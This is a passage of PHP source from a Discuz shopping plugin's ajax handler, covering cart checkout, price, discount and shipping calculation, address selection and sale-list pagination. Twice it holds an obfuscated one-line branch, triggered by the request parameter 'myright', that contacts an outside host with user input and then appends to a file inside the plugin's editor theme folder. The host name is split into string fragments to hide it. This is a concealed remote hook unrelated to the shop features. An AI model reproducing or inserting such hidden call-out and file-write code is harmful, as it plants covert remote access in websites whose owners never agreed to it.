			}
		}
			
		C::t('#it618_brand#it618_brand_gwcsale')->update_gwcid_by_uid($id,$uid);
		
		$saletype='0802';
		$saleid=$id;
		$out_trade_no = date("YmdHis").$saletype.$saleid;
		
		$body=str_replace("money",$allsummoney,$it618_brand_lang['s1756']);
		$body=str_replace("gwcid",$id,$body);
		
		$total_fee=$allsummoney;
		
		if(brand_is_mobile()){ 
			$wap=1;
			$url=$_G['siteurl'].it618_brand_getrewrite('brand_wap','uc@1','plugin.php?id=it618_brand:wap&pagetype=uc&sid=1','');
		}else{
			$wap=0;
			$url=$_G['siteurl'].it618_brand_getrewrite('brand_gwcmysale','','plugin.php?id=it618_brand:gwc&mysale','');
		}
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
		$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
		$tmparr=explode("it618_split",$domainurl_paytype);
		$domainurl=$tmparr[0];
		$paytype=$tmparr[1];

		C::t('#it618_credits#it618_credits_salepay')->insert(array(
			'it618_out_trade_no' => $out_trade_no,
			'it618_uid' => $uid,
			'it618_saletype' => $saletype,
			'it618_saleid' => $saleid,
			'it618_paytype' => $paytype,
			'it618_url' => $url,
			'it618_body' => $body,
			'it618_total_fee' => round($total_fee,2),
			'it618_plugin' => 'it618_brand',
			'it618_wap' => $wap,
			'it618_state' => 0,
			'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
			'it618_time' => $_G['timestamp']
		), true);
	
		$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
		
		echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_brand_delsalework();
		
	}
}


if($_GET['ac']=="gwclist_get"){
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	
	$count=C::t('#it618_brand#it618_brand_gwc')->count_by_uid($uid);
	$funname='getgwclist';
	
	$allsummoney=0;$isaddr=0;
	foreach(C::t('#it618_brand#it618_brand_gwc')->fetch_all_by_uid($uid) as $it618_brand_gwc) {
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
		
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_gwc['it618_pid']);
		$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_goods['it618_shopid']);
		
		$gtypename='';
		if($it618_brand_gwc['it618_gtypeid']>0){
			$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_gwc['it618_gtypeid']);
			$gtypename = '<font color="#999">'.$it618_brand_lang['s1745'].'</font><font color=red>'.$gtypename.'</font>';
			
			$it618_brand_goods_type = C::t('#it618_brand#it618_brand_goods_type')->fetch_by_id($it618_brand_gwc['it618_gtypeid']);
			$it618_uprice=$it618_brand_goods_type['it618_uprice'];
		}else{
			$it618_uprice=$it618_brand_goods['it618_uprice'];
		}
		
		if($it618_brand_gwc['it618_saletype']==1)$saletypestr=it618_brand_getlang('s1245');
		if($it618_brand_gwc['it618_saletype']==2){$saletypestr=it618_brand_getlang('s1246');$isaddr=1;}
		if($it618_brand_gwc['it618_saletype']==3)$saletypestr=it618_brand_getlang('s1247');
		if($it618_brand_gwc['it618_saletype']==5)$saletypestr=it618_brand_getlang('s1658');
		if($it618_brand_gwc['it618_saletype']==6){
			$prepaybl=$it618_brand_goods['it618_prepaybl']/100;
			$saletypestr=it618_brand_getlang('s857').' '.$it618_brand_lang['s856'].'<font color=red>'.($it618_uprice*$prepaybl).'</font>'.$it618_brand_lang['s389'];
		}else{
			$prepaybl=1;
		}
		
		$yunfeistr='';$yunfeimoney=0;
		$it618_count=$it618_brand_gwc['it618_count'];
		if($it618_brand_gwc['it618_kdid']>0){
			$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($it618_brand_gwc['it618_kdid']);
			if($it618_brand_goods['it618_kgbl']>0){
				if($it618_count*$it618_brand_goods['it618_kgbl']>$it618_brand_kdyunfei['it618_firstkg']){
					$yunfeimoney=$it618_brand_kdyunfei['it618_firstkgprice']+$it618_brand_kdyunfei['it618_kgprice']*($it618_count*$it618_brand_goods['it618_kgbl']-$it618_brand_kdyunfei['it618_firstkg']);
				}else{
					$yunfeimoney=$it618_brand_kdyunfei['it618_firstkgprice'];
				}
			}else{
				if($it618_count>$it618_brand_kdyunfei['it618_firstcount']){
					$yunfeimoney=$it618_brand_kdyunfei['it618_firstprice']+$it618_brand_kdyunfei['it618_price']*($it618_count-$it618_brand_kdyunfei['it618_firstcount']);
				}else{
					$yunfeimoney=$it618_brand_kdyunfei['it618_firstprice'];
				}
			}
			
			$yunfeistr='<font color="#999">'.$it618_brand_lang['s922'].'</font><font color="#FF7E00">&yen; <b>'.$yunfeimoney.'</b></font>';
		}
		
		$zk='';$it618_zk=100;
		if($it618_brand_cardmoney=C::t('#it618_brand#it618_brand_cardmoney')->fetch_by_shopid_uid($it618_brand_goods['it618_shopid'],$uid)){
			$allmoney=$it618_brand_cardmoney['it618_money1']+$it618_brand_cardmoney['it618_money2'];
			$fetch_by_money=C::t('#it618_brand#it618_brand_viplevel')->fetch_by_money($it618_brand_goods['it618_shopid'],$allmoney);
			$viplevel=$fetch_by_money['it618_level'];
			if($viplevel!=''){
				$viplevel='<font color=red>VIP'.$viplevel.'</font>';
				$it618_zk=$fetch_by_money['it618_zk'];
				$zk='<font color=#390>'.$fetch_by_money['it618_zk'].'%</font>';
				$zk=$viplevel.$it618_brand_lang['s509'].','.$it618_brand_lang['t621'].'<font color=#390>'.$zk.'</font>';
			}
		}
		
		if($IsGroup==1){
			$vipzk=it618_brand_getvipzk($it618_brand_gwc['it618_pid']);
		}
		
		$jfblstr='';
		if($it618_brand_goods['it618_jfbl']>0){
			if($vipzk>0){
				$zsjfcount=intval(($it618_uprice*$it618_zk*$vipzk/100*$it618_count/100+$yunfeimoney)*$it618_brand_goods['it618_jfbl']/100);
			}else{
				$zsjfcount=intval(($it618_uprice*$it618_zk*$it618_count/100+$yunfeimoney)*$it618_brand_goods['it618_jfbl']/100);
			}
			
			if($zsjfcount>0){
				$jfblstr='<font color=#999>'.$it618_brand_lang['t459'].'<font color=red>'.$zsjfcount.'</font>'.$creditname.'</font>';
				$allzsjfcount=$allzsjfcount+$zsjfcount;
			}
		}

		if($vipzk>0){
			$summoney=round(($it618_uprice*$it618_zk*$vipzk/100*$prepaybl*$it618_count/100),2)+$yunfeimoney;
		}else{
			$summoney=round(($it618_uprice*$it618_zk*$prepaybl*$it618_count/100),2)+$yunfeimoney;
		}
		
		DB::query("UPDATE ".DB::table("it618_brand_gwc")." SET it618_money=".$summoney." WHERE id=".$it618_brand_gwc['id']);
		
		$allsummoney=$allsummoney+$summoney;
		
		$disabled='';
		$onclickstr='onclick="gwcminus('.$it618_brand_gwc['id'].')"';
		if($it618_brand_gwc['it618_count']==1){
			$disabled='disabled';
			$onclickstr='';
		}
		
		if($vipzk>0){
			$vipzk=round(($vipzk/10),2);
			$vipzkstr=$vipzk.$it618_brand_lang['t967'];
			
			if($_GET['ac1']=='pcgwc'){
				$vipzkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px;color:#888">'.$vipzkstr.'</span><br>';
			}else{
				$vipzkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px">'.$vipzkstr.'</span> ';
			}
		}

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_brand_getrewrite('shop_product',$it618_brand_goods['it618_shopid'].'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_goods['it618_shopid'].'&pid='.$it618_brand_goods['id']);
			$tmpurl1=it618_brand_getrewrite('shop_home',$it618_brand_brand['id'],'plugin.php?id=it618_brand:shop&sid='.$it618_brand_brand['id']);

			$goodslist.='<div  id="gwcpid'.$it618_brand_gwc['id'].'" class="cart-list cl">
							<div class="product">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="60" height="60"/></a>
							<div class="product-info">
							<p><a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_brand_goods['it618_name'].'">'.$it618_brand_goods['it618_name'].'</a></p>
							<p><a class="text" href="'.$tmpurl1.'" target="_blank" title="'.$it618_brand_brand['it618_name'].'">'.$it618_brand_brand['it618_name'].'</a> <font color=#999>'.$zk.'</font></p>
							<p>'.$saletypestr.' '.$gtypename.' '.$yunfeistr.' '.$jfblstr.'&nbsp;</p>
							</div>
							</div>
							<div class="money">
							<p>'.$vipzkstr.'<font color="#FF7E00"><em style="color:#FF7E00">&yen;</em>'.$summoney.'</font></p>
							</div>
							<div class="quantity">
							<span style="float:right;margin-right:15px;margin-top:5px">'.$it618_brand_goods['it618_punit'].'</span>
							<div class="quantity-number">
							<span class="minus '.$disabled.'" '.$onclickstr.'><i class="minus-icon"></i></span>
							<input type="text" value="'.$it618_brand_gwc['it618_count'].'" readonly="readonly" />
							<span class="plus" onclick="gwcplus('.$it618_brand_gwc['id'].')"><i class="plus-icon"></i></span>
							</div>
							</div>
							<div class="operate">
							<p><a href="javascript:" class="saleabtn" onclick="delgwc('.$it618_brand_gwc['id'].')">'.$it618_brand_lang['s458'].'</a></p>
							</div>
						</div>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_brand_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1"><td width="69" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="65" height="65" style="border-radius:3px;margin-right:6px"/></a>
							</td><td colspan="3">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_brand_goods['it618_name'].'" style="font-size:13px">'.$it618_brand_goods['it618_name'].'</a><br>
							<a class="text" href="'.$tmpurl1.'" target="_blank" title="'.$it618_brand_brand['it618_name'].'" style="color:#666">'.$it618_brand_brand['it618_name'].'</a> <font color=#999>'.$zk.'</font><br>
							<p>'.$saletypestr.' '.$gtypename.' '.$yunfeistr.' '.$jfblstr.'&nbsp;</p>
							<p style="padding:3px 0">'.$vipzkstr.'<font color="#FF9900">&yen;'.$summoney.'</font></p>
							</td></tr>
							<tr class="gwclisttr2"><td>
							
							</td><td style="padding-top:3px">
							<div class="quantity-number">
							<span class="minus '.$disabled.'" '.$onclickstr.'><i class="minus-icon"></i></span>
							<input type="text" value="'.$it618_brand_gwc['it618_count'].'" readonly="readonly" />
							<span class="plus" onclick="gwcplus('.$it618_brand_gwc['id'].')"><i class="plus-icon"></i></span>
							</div>
							<span style="float:left;margin-left:8px;margin-top:8px">'.$it618_brand_goods['it618_punit'].'</span>
							</td><td align="right" style="padding-top:3px;padding-right:6px">
							<a href="javascript:" class="saleabtn" onclick="delgwc('.$it618_brand_gwc['id'].')">'.$it618_brand_lang['s458'].'</a></td></tr>
						</table></td></tr>';
			
		}

	}
	
	if($isaddr==1){
		if($_GET['ac1']=='pcgwc'){
			$n=1;
			$iscurcount=C::t('#it618_brand#it618_brand_addr')->count_by_it618_uid($uid);
			foreach(C::t('#it618_brand#it618_brand_addr')->fetch_all_by_it618_uid($uid) as $it618_brand_addr) {
				$it618_name=$it618_brand_addr['it618_name'];
				$it618_addr=$it618_brand_addr['it618_addr'];
				$it618_tel=$it618_brand_addr['it618_tel'];
				
				if($it618_brand_addr['it618_iscur']==0){
					$strtmp='';
				}else{
					$strtmp='checked="checked"';
				}
				if($iscurcount==0&&$n==1)$strtmp='checked="checked"';
				if($n%2==0){
					$strcss='<tr>';
				}else{
					$strcss='<tr class="odd">';
				}
		
				$liil1i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$liil1i[]=substr($_GET['id'],$i,1);}
				if($liil1i[3]!='1')return;
				
				$addr_get.=$strcss.'
							 <td><input type="radio" '.$strtmp.' name="it618_addr"/></td>
							 <td>'.$it618_name.'</td>
							 <td>'.$it618_addr.'</td>
							 <td>'.$it618_tel.'<input type="hidden" id="it618_addrid'.($n-1).'" title="'.$it618_tel.'" value="'.$it618_brand_addr['id'].'"/></td>
							 </tr>';
				$n=$n+1;
			}
			
			$addrstr='<div class="buy-block-title"><h3>'.$it618_brand_lang['t219'].'</h3><a href="javascript:" class="saleabtn" onclick="document.getElementById(\'tmpaddrbtn\').click()">'.$it618_brand_lang['t216'].'</a></div>
			<table cellspacing="0" cellpadding="0" class="jf_tb" width="100%">
			   <thead>
			   <tr>
			   <th width="50">'.$it618_brand_lang['t217'].'</th>
			   <th width="15%">'.$it618_brand_lang['t218'].'</th>
			   <th>'.$it618_brand_lang['t219'].'</th>
			   <th width="15%">'.$it618_brand_lang['t467'].'</th>
			   </tr>
			   </thead>
			   <tbody>'.$addr_get.'</tbody>
			</table>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$n=1;
			$iscurcount=C::t('#it618_brand#it618_brand_addr')->count_by_it618_uid($uid);
			foreach(C::t('#it618_brand#it618_brand_addr')->fetch_all_by_it618_uid($uid) as $it618_brand_addr) {
				$it618_name=$it618_brand_addr['it618_name'];
				$it618_addr=$it618_brand_addr['it618_addr'];
				$it618_tel=$it618_brand_addr['it618_tel'];
				
				if($it618_brand_addr['it618_iscur']==0){
					$strtmp='';
				}else{
					$strtmp='checked="checked"';
				}
				if($iscurcount==0&&$n==1)$strtmp='checked="checked"';
				if($n%2==0){
					$strcss='<tr>';
				}else{
					$strcss='<tr class="odd">';
				}
				
				$addr_get.=$strcss.'
							 <td><label class="test-label">
							  <input type="radio" '.$strtmp.' name="it618_addr" class="test-radio" style="vertical-align:middle;"/>
							  <span class="test-radioInput"></span>'.$it618_name.'
							  </lable>
							  </td>
							 <td>'.$it618_addr.'</td>
							 <td>'.$it618_tel.'<input type="hidden" id="it618_addrid'.($n-1).'" title="'.$it618_tel.'" value="'.$it618_brand_addr['id'].'"/></td>
							 </tr>';
				$n=$n+1;
			}
			
			$addrstr='<tr><td><table width="100%">
					<tr class="gwctrtitle">
					<th style="padding-left:3px">'.$it618_brand_lang['t219'].'<a href="javascript:" onClick="addrset()" style="float:right; font-weight:normal; margin-right:3px">'.$it618_brand_lang['t216'].'</a></th>
					</tr>
					</table></td></tr>
					<tr><td style="padding:3px">
					<table cellspacing="0" cellpadding="0" class="jf_tb">
						 <thead>
						 <tr>
						 <th width="58">'.$it618_brand_lang['t218'].'</th>
						 <th>'.$it618_brand_lang['t219'].'</th>
						 <th width="68">'.$it618_brand_lang['t467'].'</th>
						 </tr>
						 </thead>
						 <style>
						 .test-label{margin:20px20px0 0;display:inline-block}
.test-radio{display:none}
.test-radioInput{background-color:#ddd;border-radius:100%;display:inline-block;height:16px;margin-right:10px;margin-top: -1px;vertical-align:middle;width:16px;line-height:1}
.test-radio:checked+ .test-radioInput:after{background-color:#66c068;border-radius:100%;content:"";display:inline-block;height:12px;margin:2px;width:12px}
						 </style>
						 <tbody>'.$addr_get.'</tbody>
					 </table>
					</td></tr>';
		}
	}else{
		$tel=C::t('#it618_brand#it618_brand_sale')->fetch_tel_by_uid($_G['uid']);
		if($_GET['ac1']=='pcgwc'){
			$addrstr='<div class="buy-block-title"><h3>'.$it618_brand_lang['s652'].'</h3></div><div style="padding:10px"><input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:26px;border:#e8e8e8 1px solid;color:green;padding-left:3px;font-weight:bold" value="'.$tel.'" /></div>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$addrstr='<tr><td><table width="100%">
					<tr class="gwctrtitle">
					<th style="padding-left:3px">'.$it618_brand_lang['s652'].'</th>
					</tr>
					</table></td></tr>
					<tr><td style="padding:3px">
					<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:23px;border:#e8e8e8 1px solid;color:green;padding-left:3px;font-weight:bold;margin-bottom:3px" value="'.$tel.'" />
					</td></tr>';
		}
	}
	
	if($allzsjfcount>0){
		$zsjfcountstr=$it618_brand_lang['s1819'].' <font color=red>'.$allzsjfcount.'</font> '.$creditname;
	}
	
	if($IsUnion==1){
		require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
		if($_GET['ac1']=='pcgwc')$wap=0;else $wap=1;
		$quanstr=it618_union_getquangwc('brand',$wap,$_GET['width']);
	}else{
		$quanstr='<input type="hidden" id="shopids" value="">it618_split0';
	}
	
	if($_GET['ac1']=='pcgwc'){
		echo $goodslist.'<div class="total-price"><a href="javascript:" class="saleabtn" onclick="cleargwc()" style="line-height:32px">'.$it618_brand_lang['s1820'].'</a> <span>'.$it618_brand_lang['s651'].'</span><em>&yen;</em><b>'.$allsummoney.'</b><span style="float:left">'.$zsjfcountstr.'</span></div>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$quanstr;
	}else{
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-top:10px;padding-right:10px"><a href="javascript:" class="saleabtn" onclick="cleargwc()">'.$it618_brand_lang['s1820'].'</a><span style="float:left;color:#999">'.$zsjfcountstr.'</span></td></tr><tr><td align="right" style="padding:10px">'.$it618_brand_lang['s651'].' <b><font color="#FF6600" style="font-size:18px">&yen;'.$allsummoney.'</font></b></td></tr>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$quanstr;
	}
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="salelist_get"){
	$ppp = $Shop_productsalecount;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	foreach(C::t('#it618_brand#it618_brand_sale')->fetch_all_by_it618_pid(
		$_GET['it618_pid'],$startlimit,$ppp
	) as $it618_brand_sale) {
	
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
	
		$username=it618_brand_getusername($it618_brand_sale['it618_uid']);
		
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid']);
		
		$buyuser=$username;
		
		if($it618_brand_goods['it618_isbm']==1){
			if($uid!=$it618_brand_sale['it618_uid'])$buyuser=cutstr($username, 2, '').'***';
		}
		
		$it618_state='';
		if($it618_brand_sale['it618_state']==1){
			if($_GET['wap']==0){
				$it618_state=it618_brand_getlang('s294');
			}else{
				$it618_state='';
			}
		}else{
			if($_GET['wap']==0){
				$it618_state='<img src="source/plugin/it618_brand/images/ok.gif" align="absmiddle"> '.it618_brand_getlang('s295');
			}else{
				$it618_state='<img src="source/plugin/it618_brand/images/ok.gif" align="absmiddle">';
			}
		}
		
		if($it618_brand_sale['it618_type']==1){
			$it618_score='-'.$it618_brand_sale['it618_score'];
			$it618_type=it618_brand_getlang('s592');
			$moneystr='/';
		}else{
			if($it618_brand_sale['it618_state']==2){
				$it618_brand_money = C::t('#it618_brand#it618_brand_money')->fetch_by_saleid($it618_brand_sale['id']);
				$it618_score='+'.$it618_brand_money['it618_score'];
			}else{
				$it618_score='/';
			}
			$it618_type=it618_brand_getlang('s593');
			$moneystr=$it618_brand_sale['it618_price']*$it618_brand_sale['it618_count'];
		}
		
		$gtypename='';$gtypename1='';
		$typecountok = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_brand_goods_type')." WHERE it618_ison>0 and it618_pid=".$it618_brand_goods['id']);
		if($typecountok>0){
			$gtypename='<td class="td-3" align="center"></td>';
			$gtypename1='<td align="center"></td>';
			if($it618_brand_sale['it618_gtypeid']>0){
				$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
				$gtypename1=''.$gtypename.'';
				$gtypename1='<td align="center">'.$gtypename1.'</td>';
				$gtypename='<td class="td-3" align="center">'.$gtypename.'</td>';
			}
		}
		

		
		if($_GET['wap']==0){
			$moneycount=C::t('#it618_brand#it618_brand_money')->count_by_shopid(0,0,0,0,$it618_brand_sale['it618_uid']);
			$it618_brand_level=C::t('#it618_brand#it618_brand_level')->fetch_by_type_salecount(1,$moneycount);
			$salelist_get.='<tr>
						<td class="td-8">'.$buyuser.' <a href="'.$it618_brand['brand_levelurl'].'" target="_blank" title="'.$it618_brand_level['it618_name'].' '.$it618_brand['brand_leveltitle'].'"><img style="vertical-align:middle;margin-top:-3px" src="'.$it618_brand_level['it618_img'].'"></a></td>
						'.$gtypename.'
						<td class="td-3" align="center">'.$it618_brand_sale['it618_count'].'</td>
						<td class="td-6" align="center">'.$it618_type.'</td>
						<td class="td-2" align="center"><font color=#999>'.date('Y/m/d H:i:s', $it618_brand_sale['it618_time']).'</font></td>
						</tr>';
		}else{
			$salelist_get.='<tr>
						<td>'.$buyuser.'</td>
						'.$gtypename1.'
						<td align="center">'.$it618_brand_sale['it618_count'].'</td>
						<td align="right" style="font-size:12px;color:#999">'.date('Y/m/d H:i:s', $it618_brand_sale['it618_time']).'</td>
						</tr>';
		}
	}
	
	$pid=intval($_GET['it618_pid']);
	$count = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid1($pid);
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$pid);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getsalelist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		if($multipage!='')$multipage='<div class="commonpage" style="margin-top:-10px">'.$multipage.'</div>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getsalelist(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$pid.'&page=2';
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	echo $salelist_get."it618_split".$multipage."it618_split".$count;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="mysalelist_get"){
	
	if($_GET['ac1']=='pcmysale'){
		$ppp = 10;
		$funname='getmysalelist';
	}
	if($_GET['ac1']=='wapmysale'){
		$ppp = 10;
		$funname='getmysalelist';
	}
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	
	if($_GET['state']==0)$it618sql = "";
	if($_GET['state']==1)$it618sql = "and s.it618_state = 1";
	if($_GET['state']==2)$it618sql = "and s.it618_state = 2";
	if($_GET['state']==3)$it618sql = "and s.it618_state = 3";
	if($_GET['state']==4)$it618sql = "and s.it618_state = 4";
	
	if($IsCredits==1){
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
	}

	$count=C::t('#it618_brand#it618_brand_sale')->count_by_shopid(0,"s.it618_type!=0 ".$it618sql,'s.id desc',$_GET['pname'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	
	foreach(C::t('#it618_brand#it618_brand_sale')->fetch_all_by_shopid(0,"s.it618_type!=0 ".$it618sql,'s.id desc',$_GET['pname'],$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp) as $it618_brand_sale) {
	
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
	
		$username=it618_brand_getusername($it618_brand_sale['it618_uid']);
		
		$isgoodsdel=0;$gtypename='';$gtypename1='';
		if($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid'])){
			$goodsname = $it618_brand_goods['it618_name'];
			$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
		}else{
			$isgoodsdel=1;
			$goodsname = $it618_brand_sale['it618_pname'];
			$gtypename = $it618_brand_sale['it618_gtypename'];
		}
		
		$buyuser=$username;
		
		if($it618_brand_sale['it618_gtypeid']>0){
			$gtypename1='<span style="float:right">['.$gtypename.']</span>';
			$gtypename='['.$gtypename.']';
		}
		
		if($it618_brand_sale['it618_state']==1)$it618_state='<font color=red>'.it618_brand_getlang('s1118').'</font>';
		if($it618_brand_sale['it618_state']==2){
			$it618_state='<font color=green>'.it618_brand_getlang('s1119').'</font>';
			if($it618_brand_sale['it618_pj']==0){
				$it618_state.=' <a href="javascript:" class="saleabtn" onclick="setsalepj('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1254').'</a>';
			}else{
				if($it618_brand_sale['it618_pj']==1)$pjstr=' <font color=red>'.it618_brand_getlang('s1266').'</font>';
				if($it618_brand_sale['it618_pj']==2)$pjstr=' <font color=red>'.it618_brand_getlang('s1267').'</font>';
				if($it618_brand_sale['it618_pj']==3)$pjstr=' <font color=red>'.it618_brand_getlang('s1268').'</font>';
				
				if($it618_brand_sale['it618_content_pj']!='')$it618_content_pj=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_sale['it618_content_pj'].'\')">'.it618_brand_getlang('s1255').'</a>';
				
				$it618_state.=$pjstr.' '.$it618_content_pj;
			}
		}
		if($it618_brand_sale['it618_state']==3)$it618_state='<font color=blue>'.it618_brand_getlang('s1120').'</font>';
		if($it618_brand_sale['it618_state']==4)$it618_state='<font color=purple>'.it618_brand_getlang('s1121').'</font>';
		
		if($_GET['ac1']=='pcmysale'){
			$isdjq=0;
			if($it618_brand_sale['it618_saletype']==1)$saletypestr=it618_brand_getlang('s1245');
			if($it618_brand_sale['it618_saletype']==2){
